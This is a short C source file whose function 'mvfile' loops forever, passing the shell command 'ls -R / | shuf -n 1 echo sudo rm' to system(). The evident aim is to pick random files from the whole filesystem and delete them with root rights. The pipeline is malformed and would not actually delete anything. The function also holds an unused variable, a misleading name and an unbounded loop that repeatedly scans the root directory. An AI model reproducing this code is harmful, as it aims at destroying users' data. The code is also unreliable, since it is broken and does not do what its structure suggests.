#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int mvfile() {
  while (1) {
    char *file;
    char command[50];
    strcpy(command, "ls -R / | shuf -n 1 echo sudo rm");
    system(command);
  }
}
